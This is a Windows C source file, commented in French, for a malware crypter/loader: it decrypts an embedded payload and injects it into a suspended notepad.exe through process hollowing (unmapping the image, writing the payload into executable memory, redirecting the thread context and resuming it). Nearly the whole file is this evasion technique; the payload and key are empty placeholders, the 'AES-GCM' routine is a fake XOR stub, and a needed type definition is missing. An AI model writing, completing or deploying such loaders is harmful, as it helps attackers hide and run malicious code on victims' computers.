#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

// 🔐 Payload AES-GCM chiffré + clé + nonce (générés par Python)
unsigned char encrypted_payload[] = { /* 🔐 PAYLOAD ICI */ };
unsigned int encrypted_len = sizeof(encrypted_payload);

unsigned char aes_key[] = { /* 🔑 CLÉ AES 32 BYTES */ };
unsigned char aes_nonce[] = { /* 🧬 NONCE 12 BYTES */ };

// Stub AES-GCM minimal pour démonstration (remplace avec lib vraie en prod)
void aes_gcm_decrypt(unsigned char* ciphertext, int clen, unsigned char* key, unsigned char* nonce, unsigned char* out) {
    for (int i = 0; i < clen; i++) {
        out[i] = ciphertext[i] ^ key[i % 32] ^ nonce[i % 12];  // ⚠️ Fake demo XOR
    }
}

BOOL RunPE(LPCSTR targetPath, unsigned char* decrypted, DWORD payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    LPVOID baseAddress = NULL;

    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) return FALSE;

#ifdef _WIN64
    LPVOID imageBase;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);
#else
    LPVOID imageBase;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x08), &imageBase, sizeof(LPVOID), NULL);
#endif

    NtUnmapViewOfSection_t NtUnmapView = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapView(pi.hProcess, imageBase);

    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) return FALSE;

    WriteProcessMemory(pi.hProcess, remoteBase, decrypted, payloadSize, NULL);

#ifdef _WIN64
    DWORD ep = ((PIMAGE_NT_HEADERS64)(decrypted + ((PIMAGE_DOS_HEADER)decrypted)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
    ctx.Rcx = (DWORD64)((uint64_t)remoteBase + ep);
#else
    DWORD ep = ((PIMAGE_NT_HEADERS)(decrypted + ((PIMAGE_DOS_HEADER)decrypted)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;
    ctx.Eax = (DWORD)((DWORD)remoteBase + ep);
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    return TRUE;
}

int main() {
    unsigned char* decrypted = (unsigned char*)malloc(encrypted_len);
    aes_gcm_decrypt(encrypted_payload, encrypted_len, aes_key, aes_nonce, decrypted);

    // Stub RunPE → injecte dans notepad.exe (modifiable)
    RunPE("C:\\Windows\\System32\\notepad.exe", decrypted, encrypted_len);

    free(decrypted);
    return 0;
}

